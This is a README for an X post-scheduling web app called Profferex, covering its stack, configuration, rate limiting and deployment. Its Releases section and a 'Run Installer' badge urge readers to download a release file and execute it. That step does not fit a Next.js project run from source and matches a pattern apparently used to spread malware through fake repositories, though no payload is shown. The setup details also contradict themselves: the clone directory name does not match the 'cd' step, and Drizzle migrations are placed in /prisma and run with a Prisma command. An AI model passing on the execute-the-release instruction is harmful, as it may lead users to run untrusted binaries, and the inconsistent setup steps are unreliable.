# Profferex — Pro Yapper on X: Schedule Posts, Grow Sales

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/GapJohn23/profferex---proffesional-yapper-on-x-/releases)

Profferex helps creators and founders plan X (formerly Twitter) activity. You write messages, schedule flows, and focus on product work. The app queues posts, handles rate limits, stores assets, and tracks delivery. It aims to keep traffic steady when you step away.

![Social scheduling illustration](https://images.unsplash.com/photo-1559526324-593bc073d938?auto=format&fit=crop&w=1400&q=80)

Table of contents
- Features
- Who should use this
- Key concepts
- Tech stack
- Architecture
- Quick start
- Configuration
- Scheduling examples
- Rate limiting and retries
- Storage and DB
- Auth and security
- Deployment
- Releases
- Contributing
- License
- FAQ
- Screenshots

Features
- Planned threads and single posts. Chain posts into campaigns.
- Per-account scheduling. Rotate multiple X accounts.
- Rate limit manager. Prevent account suspension.
- Persistent queue with retries and backoff.
- Media uploads to Cloudflare R2.
- Drizzle ORM on PostgreSQL for structured data.
- Neon DB support for serverless Postgres.
- Redis for short-term locks and counters.
- Tailwind CSS UI built on Next.js.
- Job delivery via QStash and server-side workers.
- Simple auth for team access.

Who should use this
- Solo founders who want steady social rhythm.
- Small shops that run timed campaigns.
- Product teams that need predictable outreach.
- Social managers who avoid manual posting.

Key concepts
- Campaign: a set of posts grouped by goal.
- Entry: a single post in a campaign.
- Schedule: a timestamp or cron for an entry.
- Queue worker: a service that sends posts to X.
- Backoff: a retry strategy on transient failures.
- Rate bucket: a token bucket per account to shape throughput.

Tech stack
- Frontend: Next.js + Tailwind CSS
- Backend: Node.js serverless workers or server
- ORM: Drizzle ORM for typesafe queries
- DB: PostgreSQL (Neon DB compatible)
- Cache: Redis for locks and counters
- Storage: Cloudflare R2 for media
- Messaging: QStash for delayed jobs and webhooks
- Auth: Better-Auth for user sessions and tokens
- Rate limiting: Custom rate limiter with Redis + QStash
- Deployment: Deploy on platforms that support serverless or Node

Architecture
- Next.js serves UI and API routes.
- API enqueues jobs into QStash.
- Worker consumes QStash messages and runs delivery logic.
- Deliveries call X API, upload media to R2.
- Drizzle ORM stores campaign and post state.
- Redis tracks per-account rate buckets and locks.
- NeonDB or Postgres stores core data.
- Releases contain binaries or deployment artifacts you run.

Quick start
1. Clone the repo.
   git clone https://github.com/GapJohn23/profferex---proffesional-yapper-on-x-.git
2. Install dependencies.
   cd profferex
   pnpm install
3. Set environment variables (see below).
4. Run the dev server.
   pnpm dev
5. Start a worker (separate process).
   pnpm worker

Configuration
Create a .env.local with the values below. Adjust names to match your provider.

.env.local (example)
NODE_ENV=development
NEXT_PUBLIC_APP_NAME=Profferex
DATABASE_URL=postgresql://user:pass@host:5432/profferex
NEON_DB_URL=postgresql://...
REDIS_URL=redis://default:pass@host:6379
CLOUDFLARE_R2_ACCOUNT_ID=your_account_id
CLOUDFLARE_R2_ACCESS_KEY_ID=key_id
CLOUDFLARE_R2_SECRET_ACCESS_KEY=secret
QSTASH_SIGNING_KEY=your_qstash_key
X_API_KEY=twitter_api_key
X_API_SECRET=twitter_api_secret
SESSION_SECRET=strong_random_secret

Migrations
- The repo includes Drizzle migration files in /prisma or /migrations.
- Run the migration CLI:
  pnpm prisma migrate deploy
  or
  pnpm drizzle-kit push

Scheduling examples
- Single delayed post:
  {
    "accountId": "acct_01",
    "text": "New feature live. Read the thread.",
    "scheduledAt": "2025-09-01T12:00:00Z"
  }
- Thread (sequence):
  - Entry 1: scheduledAt 12:00
  - Entry 2: scheduledAt 12:05 (chainDelay setting)
- Recurring cadence:
  - Campaign with cron "0 18 * * 1,3,5" posts weekly on Mon/Wed/Fri at 18:00

The system converts schedules into QStash messages. Workers claim messages, check rate buckets, upload media, and submit to X.

Rate limiting and retries
- Each X account has a token bucket in Redis.
- Tokens refill at a configured rate.
- If a post would exceed the bucket, the job delays and re-enqueues.
- The worker implements exponential backoff on 429 and 5xx errors.
- Use QStash retries for durable delivery.

Code example: token check (pseudo)
const tokens = await redis.decrby(key, cost);
if (tokens < 0) {
  await redis.incrby(key, cost);
  reenqueue(job, delayMs);
  return;
}
sendToX(job);

Storage and media
- Upload images, GIFs, and video to Cloudflare R2.
- Store public URLs in the post payload.
- Keep metadata in Postgres: mime-type, size, width, height.
- Use signed URLs for uploads from the browser to R2 if you want direct uploads.

Auth and security
- Use Better-Auth for session management and strategies.
- Store X OAuth tokens encrypted in DB.
- Rotate API secrets on a schedule.
- Use environment secrets for cloud keys.
- Sign QStash webhooks with QSTASH_SIGNING_KEY.

Database design (high level)
- accounts: id, name, x_handle, oauth_token_enc
- campaigns: id, name, owner_id, status
- entries: id, campaign_id, text, media_refs[], scheduled_at, status
- deliveries: id, entry_id, worker_id, response_code, response_body, attempt_count
- rate_buckets: account_id, tokens, last_refill

Deployment
- Build Next.js:
  pnpm build
- Deploy to a platform of choice.
- If deploying serverless, run workers as separate functions or durable tasks.
- For edge-friendly deploys, push static assets and host serverless API endpoints where you can run background queues.

CI/CD
- Use GitHub Actions or your CI.
- Run lint, tests, and build steps on PRs.
- On merge, publish a release artifact in Releases.
- The release artifact contains a Docker image tag or a runnable package.

Releases
Download the release file from https://github.com/GapJohn23/profferex---proffesional-yapper-on-x-/releases and execute it. The releases page includes packaged runners and deployment artifacts. Use the artifact that matches your platform. If you run a Linux server, download the linux binary or Docker image. If you use serverless, use the zip artifact for the worker.

[![Releases](https://img.shields.io/badge/Get%20Release-Run%20Installer-green?logo=github)](https://github.com/GapJohn23/profferex---proffesional-yapper-on-x-/releases)

Contributing
- Fork the repo.
- Create a feature branch.
- Run tests.
- Open a PR with clear scope and small changes.
- Use descriptive commit messages.

Coding style
- Use TypeScript on server and client.
- Prefer small, pure functions in workers.
- Keep UI components stateless where possible.
- Write tests for scheduling rules and rate limiter.

Testing
- Unit test delivery logic with mocked X responses.
- Integration test queue flows with a local QStash emulator or stub.
- Use a disposable Postgres instance for DB tests.

Troubleshooting
- If posts stall, check Redis token counts.
- If media fails, verify R2 keys and bucket permissions.
- If webhooks fail, check QStash signing key and URL reachability.
- If DB schema mismatch appears, run migrations.

Screenshots and assets
- UI dashboard sample:
  https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=1200&q=80
- Campaign timeline illustration:
  https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=1200&q=80

FAQ
Q: Can I run Profferex with a single account?
A: Yes. You can add one account and schedule posts for it.

Q: Does it post media?
A: Yes. Upload media to Cloudflare R2 or submit public URLs.

Q: How does it avoid X rate limits?
A: It uses per-account token buckets and delays when needed.

Q: Can I host the worker separately?
A: Yes. Run the worker as a separate process, container, or serverless function.

Security checklist
- Use strong SESSION_SECRET.
- Restrict R2 keys to required operations.
- Rotate X app keys if compromised.
- Limit access to DB credentials.

License
- Choose a license that fits your project. Add LICENSE file to the repo.

Contact
- Open issues in the repo for bugs and feature requests.
- Use PRs for code contributions.

References and links
- QStash docs: https://docs.upstash.com/qstash
- Drizzle ORM: https://orm.drizzle.team
- Neon DB: https://neon.tech
- Cloudflare R2: https://developers.cloudflare.com/r2
- Better-Auth: check the package docs in the repo

End of file.